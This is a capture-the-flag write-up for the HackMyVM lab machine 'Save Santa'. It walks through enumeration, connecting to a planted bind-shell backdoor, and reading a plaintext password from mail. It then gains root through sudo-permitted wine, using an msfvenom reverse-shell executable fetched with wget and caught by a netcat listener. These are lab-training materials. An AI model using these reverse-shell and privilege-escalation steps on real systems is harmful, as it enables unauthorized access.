---
title: Write-up Save Santa on HackMyVM
author: eMVee
date: 2024-03-04 20:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, OSCP, PNPT, xmas, wine, sudo, backdoor, bind shell]
render_with_liquid: false
---

During some days off between Christmas and New Year's Eve, a new idea for a vulnerable machine arose. The title of the machine 'Save Santa' was quickly invented. The machine is designed for beginners and the focus to pwn this machine should also be on enumeration. The machine can be downloaded from [www.hackmyvm.eu](https://www.hackmyvm.eu). In this write-up I describe how you could hack this machine. If you want to learn something, try hacking this machine yourself first and if you really can’t figure it out, you can read this writeup to learn from it.

## Getting started
To set up the vulnerable machine in the lab environment, we'll import it and configure its virtual network. This machine was built in Oracle VirtualBox, so it should function smoothly within the lab. We've created a separate virtual network specifically for vulnerable machines. Make sure to configure the new vulnerable machine to utilize this virtual network.

Before we start any hacking activity we should create a working directory for this machine and check our own IP address.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ mkdir SaveSanta

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ cd SaveSanta

┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ ip a        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0e:ca:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 507sec preferred_lft 507sec
    inet6 fe80::a00:27ff:fe0e:cae6/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:ec:27:3a:57 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
```
Next step is to identify the IP address of our target on our virtual network. We can do this by running the fping command.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.39
```
As soon as we have identified the IP address of our target we should assign it to a variable so we can use it in our commands. One of the first commands we can run smoothly is a ping request to see if it answers to our request.

```bash 
┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ ip=10.0.2.39

┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ ping -c 3 $ip                                  
PING 10.0.2.39 (10.0.2.39) 56(84) bytes of data.
64 bytes from 10.0.2.39: icmp_seq=1 ttl=64 time=0.477 ms
64 bytes from 10.0.2.39: icmp_seq=2 ttl=64 time=0.623 ms
64 bytes from 10.0.2.39: icmp_seq=3 ttl=64 time=0.893 ms

--- 10.0.2.39 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2049ms
rtt min/avg/max/mdev = 0.477/0.664/0.893/0.172 ms
```
Based on the value in the ttl field we can almost tell that this machine is probably running on a Linux operating system.

## Enumeration
Our next step should be identifying open ports and services. We can simply do this by running a nmap port scan.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-04 15:16 CET
Nmap scan report for 10.0.2.39
Host is up (0.00094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:06:46:f1:83:85:a4:22:8c:2b:12:d4:2d:58:27:49 (ECDSA)
|_  256 76:54:26:9d:e8:4a:72:5e:6e:7f:68:58:20:6e:bb:d4 (ED25519)
80/tcp open  http    Apache httpd
| http-robots.txt: 3 disallowed entries 
|_/ /administration/ /santa
|_http-title: The Naughty Elves
|_http-server-header: Apache
MAC Address: 08:00:27:99:CD:C7 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.94 ms 10.0.2.39

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.48 seconds

```
There are some open ports and services identified. We should add those to our notes.
- Linux, probably Ubuntu
- Port 22
    - SSH
    - OpenSSH 9.0p1
- Port 80
    - HTTP
    - Apache
    - Title: The Naughty Elves
    - Robots.txt - Disallowed
        - /
        - /administration
        - /santa

Let's enumerate the website with whatweb.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ whatweb http://$ip                                                                                   
http://10.0.2.39 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.0.2.39], Title[The Naughty Elves]                                                                                                           
```
We did not discover any new information. Perhaps we should take a look at the website in our browser. 

![image](/assets/img/WriteUp/HackMyVM/SaveSanta/Pasted image 20240104152030.png){: width="700" height="400" }

It looks like the website is defaced by the 'The Naught Elves' and that the system as heen compromised. Let's enumerate further to see if we can find any entrance.
There is a hyperlink in red on the page. Let's find out what they have to say.

![image](/assets/img/WriteUp/HackMyVM/SaveSanta/Pasted image 20240104152053.png){: width="700" height="400" }

We are ricked rolled by the Naughty Elves! There was a robots.txt file on the server. We should inspect those directories manually. Perhaps there is something.


```bash
┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ curl http://10.0.2.39/robots.txt
User-agent: *
Disallow: /
Disallow: /administration/
Disallow: /santa
```
Both directories are interesting to us. Let's visit the administration directory first. This redirects us to the media page.
Next we should check the santa directory.

![image](/assets/img/WriteUp/HackMyVM/SaveSanta/Pasted image 20240104152144.png){: width="700" height="400" }

Well, this looks interesting, a login page. While working on this page, suddenly we get an error that the page could not be found.

![image](/assets/img/WriteUp/HackMyVM/SaveSanta/Pasted image 20240104160516.png){: width="700" height="400" }

If this page suddenly disappeared, let's see if the main page is still there.

![image](/assets/img/WriteUp/HackMyVM/SaveSanta/Pasted image 20240104153137.png){: width="700" height="400" }

A new main page has been published. It clearly states that the system has been taken over by malicious parties and they are working to restore it. Time to perform a new port scan on our target.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-04 15:31 CET
Nmap scan report for 10.0.2.39
Host is up (0.00057s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:06:46:f1:83:85:a4:22:8c:2b:12:d4:2d:58:27:49 (ECDSA)
|_  256 76:54:26:9d:e8:4a:72:5e:6e:7f:68:58:20:6e:bb:d4 (ED25519)
80/tcp    open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Merry Christmas to everyone - Santa Claus
59025/tcp open  unknown
MAC Address: 08:00:27:99:CD:C7 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.57 ms 10.0.2.39

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.68 seconds

```
Besides the fact that another title has now been found in the port scan, there is also a new port (59025) open. Let's use netcat to see what is running on this port.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ nc $ip 59025
(UNKNOWN) [10.0.2.39] 59025 (?) : Connection refused
```
## Initial access

The connection was not established. The Naughty Elves may have opened a backdoor on the system. Let's try it again in a moment.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ nc $ip 59025
whoami
alabaster
id 
uid=1001(alabaster) gid=1001(alabaster) groups=1001(alabaster),100(users)
hostname
santa
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:99:cd:c7 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.39/24 metric 100 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 382sec preferred_lft 382sec
    inet6 fe80::a00:27ff:fe99:cdc7/64 scope link 
       valid_lft forever preferred_lft forever
```
Let's upgrade our shell first.
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
alabaster@santa:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
<l/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
alabaster@santa:~$ export TERM=xterm-256color  
export TERM=xterm-256color  
alabaster@santa:~$ alias ll='ls -lsaht --color=auto'  
alias ll='ls -lsaht --color=auto'  
alabaster@santa:~$ ^Z
zsh: suspended  nc $ip 59025
                                                                                                                   
┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ stty raw -echo ; fg ; reset  
[1]  + continued  nc $ip 59025

alabaster@santa:~$ stty columns 200 rows 200
alabaster@santa:~$ 

```
Let's find out what is present in the current working directory.
```bash
alabaster@santa:~$ ls
user.txt
```
Time to capture the user's flag.
```bash
alabaster@santa:~$ cat user.txt 
                 ..'''::::...
              .::'      `'''':::..
        '...::'               `.----.
                              /_.--._\
                            ,  |=   |
                          ,/ \,|  =-|
                        ,/ /`\ \,   |
                      ,/ /`___`\ \,-|
                    ,/ /'.-:";-.`\ \|
                  ,/ /` //_|_|_\\ `\ \, ,/\,
                ,/ /`   ||_|_|_||   `\;/ /\ \,
              ,/ /`     ||_|_|_||   ,/ /`/\`\ \,
            ,/ /`    ==_`-------' ,/ /` ~\/~ `\ \,
          ,/ /` __|     _       ,/ /`         =`\ \,
        ,/ /`==_     __|___-  ,/ /` ==-=|__|     `\ \,
      ,/ /`        --=      ,/ /`            __|-- `\ \,
    ,/ /`  |__ ..----.. = ,/ /`()    .-"""""-.     ()`\ \,
   / /`|     .'_.-;;-._'./ /; {__} .'.-"""""-.'.  {__} ;\ \
  |/`  |_| =/.; | || | ;|/` | |::|/.'  _____  '.\ |::| | `\|
       |   |/_|_|_||_|_|_\| |=\::/||  /|_|_|\  || \::/ |
       | -=|| | | || | | || |  || || |_|_|_|_| ||  |||_|
       | , ||-|-|-||-|-|-||=|  JL || |_|_|_|_| ||  JL  |
       |/_\||_|_|_||_|_|_||-|'    ||   .:::.   ||=_   _|
       /_ (|| | | || | | || |  ==_|| /:::::::\ || __P__|
       /_\ \|-|-|-||-|-|-|| |     || |::(`)::| ||/\ |  `\
      `>/ _\\_|_|_||_|_|_||-|-'|__|| \/`\+/`\/ ||||_____|
      /_/   <-------------' |     ||()\_/Y\_/  ||/  || |
     /  ` \_ ( ==_  __|-    |_|_  ||   / / \   || =_|| |
    `/_) | _ <`   __        |   = ||  /_/ \_\  ||   || |
     >  /     \ == _  ==_   | -   ||           ||=  || |
    /_/   ( \  `\ _| =__   =|-__|_||-----------||_| || |
   )-._/ _\ _,-('    __.;-'-;__     `"""""""""""    ||`"-._
  '-,._   \__.-`-;''`          ``--'`""'"""`"""``-- `--'--. '
       ```             ``         `""""'""""'"`""".--------

                HMV{HERE IS THE USER FLAG}
alabaster@santa:~$ 

```
Next we could check if the user has eny emails.

```bash
alabaster@santa:~$ mail
"/var/mail/alabaster": 1 message 1 new
>N   1 Santa Claus        Thu Jan  4 14:28  25/1106  Important update about the hack
? 

```
It looks like Santa did sent an email with an important update about the hack. We should read the email.
```bash
? 1
Return-Path: <santa@santa.hmv>
Received: from santa.hmv (localhost [127.0.0.1])
        by santa.hmv (8.17.1.9/8.17.1.9/Debian-2) with ESMTP id 404ES2Dq001267
        for <alabaster@santa.hmv>; Thu, 4 Jan 2024 14:28:02 GMT
Received: (from santa@localhost)
        by santa.hmv (8.17.1.9/8.17.1.9/Submit) id 404ES28Z001266;
        Thu, 4 Jan 2024 14:28:02 GMT
From: Santa Claus <santa@santa.hmv>
Message-Id: <202401041428.404ES28Z001266@santa.hmv>
Subject: Important update about the hack
To: <alabaster@santa.hmv>
User-Agent: mail (GNU Mailutils 3.15)
Date: Thu,  4 Jan 2024 14:28:02 +0000

Dear Alabaster, 

As you know our systems have been compromised. You have been assigned to restore all systems as soon as possible. 

I heard you have kicked out the Naughty Elfs so they cannot come back into the system. To be more secure we have hired Bill Gates. 

His account has been created and ready to logon. When Bill arrives, tell him his username is 'bill'. The password has been set to: 'JingleBellsPhishingSmellsHackersGoAway' He will know what to do next. 

Please help Bill as much as possible so Christmas can go on! 

- Santa
? 

```
We have found a new username and password. Santa did hire Bill Gates.
Let's exit the emai of the user.
```bash
? exit
```
We should try to switch to the new user.
```bash
alabaster@santa:~$ su bill
Password: 
$ whoami
bill
```
We are now bill on the system. We should find out if we can sudo anything.
```bash
$ sudo -l
Matching Defaults entries for bill on santa:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bill may run the following commands on santa:
    (ALL) NOPASSWD: /usr/bin/wine

```
Bill has the right to run wine as sudoer. Since wine can be run with sudo we might be able to gain root privileges.

## Privilege escalation
First we should create a reverse shell with msfvenom so we hace an executable.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=443 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```
Next we should host the file so we can transfer it to the victim.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ sudo python3 -m http.server 80                                                         
[sudo] password for emvee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
We should change the working direcotry to the home directory of Bill. Here we can download the reverse shell executable.

```bash
$ cd ~
$ wget http://10.0.2.15/shell.exe
--2024-01-04 14:40:21--  http://10.0.2.15/shell.exe
Connecting to 10.0.2.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7168 (7.0K) [application/x-msdos-program]
Saving to: ‘shell.exe’

shell.exe                                           0%[                                                            shell.exe                                         100%[=============================================================================================================>]   7.00K  --.-KB/s    in 0s      

2024-01-04 14:40:21 (512 MB/s) - ‘shell.exe’ saved [7168/7168]

```
As soon as the reverse shell is downloaded we should start our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ sudo rlwrap nc -lvnp 443      
listening on [any] 443 ...

```
Since we are ready to get a shell as root we only have to launch shell.exe with wine.
```bash
$ sudo /usr/bin/wine shell.exe
it looks like wine32 is missing, you should install it.
multiarch needs to be enabled first.  as root, please
execute "dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32:i386"
0094:err:winediag:nodrv_CreateWindow Application tried to create a window, but no driver could be loaded.
0094:err:winediag:nodrv_CreateWindow L"The explorer process failed to start."
0094:err:systray:initialize_systray Could not create tray window

```
After starting we should check our netcat listener to see if the connection has been established.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/SaveSanta]
└─$ sudo rlwrap nc -lvnp 443      
listening on [any] 443 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.39] 35994
Microsoft Windows 6.1.7601

Z:\home\bill>

```
We got a shell from our target. Since wine is running our reverse shell it looks like we are working on 'Microsoft Windows 6.1.7601', what is not true.
We should now check who we are and capture the root flag.


```bash
Z:\home\bill>whoami
SANTA\root

Z:\home\bill>hostname
SANTA

Z:\home\bill>cd \root

Z:\root>dir
Volume in drive Z has no label.
Volume Serial Number is 4afb-ec36

Directory of Z:\root

  1/4/2024  12:25 PM  <DIR>         .
12/30/2023   6:55 PM  <DIR>         ..
12/30/2023   8:10 PM         3,130  root.txt
12/30/2023   7:16 PM  <DIR>         snap
       1 file                     3,130 bytes
       3 directories      2,356,211,712 bytes free


Z:\root>type root.txt
                               ..,,,,,,,,,,,,,,,,.. 
                        ..,,;;;;;;;;;;;;;;;;;;;;;;;;;;,,. 
                    .,::::;;;;aaaaaaaaaaaaaaaaaaaaaaaaaaa;;,,. 
                .,;;,:::a@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@a, 
              ,;;;;.,a@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@a 
           ,;;;;%;.,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@a, 
        ,;%;;;;%%;,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
     ,;;%%;;;;;%%;;@@@@@@@@@@@@@@'%v%v%v%v%v%v%v%v%v%v%v%v`@@@@@@@@@ 
   ,;;%%;;;;:;;;%;;@@@@@@@@@'%vvvvvvvvvnnnnnnnnnnnnnnnnvvvvvv%`@@@@' 
  ,;%%;;;;;:;;;;;;;;@@@@@'%vvva@@@@@@@@avvnnnnnnnnnnvva@@@@@@@OOov, 
 ,;%;;;;;;:::;;;;;;;@@'OO%vva@@@@@@@@@@@@vvnnnnnnnnvv@@@@@@@@@@@Oov 
 ;%;;;;;;;:::;;;;;;;;'oO%vvn@@%nvvvvvvvv%nnnnnnnnnnnnn%vvvvvvnn%@Ov 
 ;;;;;;;;;:::;;;;;;::;oO%vvnnnn>>nn.   `nnnnnnnnnnnn>>nn.   `nnnvv' 
 ;;;;;;;;;:::;;;;;;::;oO%vvnnvvmmmmmmmmmmvvvnnnnnn;%mmmmmmmmmmmmvv, 
 ;;;;;;;;;:::;;;;;;::;oO%vvmmmmmmmmmmmmmmmmmvvnnnv;%mmmmmmmmmmmmmmmv, 
 ;;;;;;;;;;:;;;;;;::;;oO%vmmmmnnnnnnnnnnnnmmvvnnnvmm;%vvnnnnnnnnnmmmv 
  `;%;;;;;;;:;;;;::;;o@@%vvmmnnnnnnnnnnnvnnnnnnnnnnmmm;%vvvnnnnnnmmmv 
   `;;%%;;;;;:;;;::;.oO@@%vmmnnnnnnnnnvv%;nnnnnnnnnmmm;%vvvnnnnnnmmv' 
     `;;;%%;;;:;;;::;.o@@%vvnnnnnnnnnnnvv%;nnnnnnnmm;%vvvnnnnnnnv%'@a. 
      a`;;;%%;;:;;;::;.o@@%vvvvvvvvvvvvvaa@@@@@@@@@@@@aa%%vvvvv%%@@@@o. 
     .@@o`;;;%;;;;;;::;,o@@@%vvvvvvva@@@@@@@@@@@@@@@@@@@@@avvvva@@@@@%O, 
    .@@@@@Oo`;;;;;;;;::;o@@@@@@@@@@@@@@@@@@@@"""""""@@@@@@@@@@@@@@@@@OO@a 
  .@@@@@@@@@OOo`;;;;;;:;o@@@@@@@@@@@@@@@@"           "@@@@@@@@@@@@@@oOO@@@, 
 .@@@@o@@@@@@@OOo`;;;;:;o,@@@@@@@@@@%vvvvvvvvvvvvvvvvvv%%@@@@@@@@@oOOO@@@@@, 
 @@@@o@@@@@@@@@OOo;::;'oOOooooooooOOOo%vvvvvvvvvvvvvv%oOOooooooooOOO@@@O@@@, 
 @@@oO@@@@@@@@@OOa@@@@@a,oOOOOOOOOOOOOOOoooooooooooooOOOOOOOOOOOOOO@@@@Oo@@@ 
 @@@oO@@@@@@@OOa@@@@@@@@Oo,oO@@@@@@@@@@OOOOOOOOOOOOOO@@@@@@@@@@@@@@@@@@Oo@@@ 
 @@@oO@@@@@@OO@@@@@@@@@@@OO,oO@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@ 
 @@@@o@@@@@@OO@@@@@@@@@@OOO,oO@@@@@@@@@O@@@@@@@@@@@@@@@@@@@@@o@@@@@@@@@O@@@@ 
 @@@@@o@@@@@OOo@@@@@@@OOOO'oOO@@@@@@@@Oo@@@@@@@@@@@@O@@@@@@@@Oo@@@@@@@@@@@@a 
`@@@@@@@O@@@OOOo`OOOOOOO'oOO@@@@@@@@@O@@@@@@@@@@@@@@@O@@@@@@@@Oo@@@@@@@@@@@@ 
 `@@@@@OO@@@@@OOOooooooooOO@@@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@@@@@Oo@@@@@@oO@@@@ 
   `@@@OO@@@@@@@@@@@@@@@@@@@O@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@@@@@O@@@@@@@oO@@@' 
      `@@`O@@@@@@@@@@@@@@@@@@@Oo@@@@@@@@@@@@@@@@@@@@@@Oo@@@@@@@@@@@@@@@O@@@' 
        `@ @@@@@@@@@@@@@@@@@@@OOo@@@@@@@@@@@@@@@@@@@@@O@@@@@@@@@@@@@@@'@@' 
           `@@@@@@@@@@@@@@@@@@OOo@@@@@@@@@@@@@@@@@@@@O@@@@@@@@@@@@@@@ a' 
               `@@@@@@@@@@@@@@OOo@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@@@@@@' 
                  `@@@@@@@@@@@Oo@@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@@' 
                      `@@@@@@Oo@@@@O@@@@@@@@@@@@@@@@@@@'o@@' 
                          `@@@@@@@@oO@@@@@@@@@@@@@@@@@ a' 
                              `@@@@@oO@@@@@@@@@@@@@@' ' 
                                '@@@o'`@@@@@@@@' 
                                 @'   .@@@@' 
                                     @@' 
                                   @'

                HMV{HERE IS THE ROOT FLAG}

Z:\root>

```


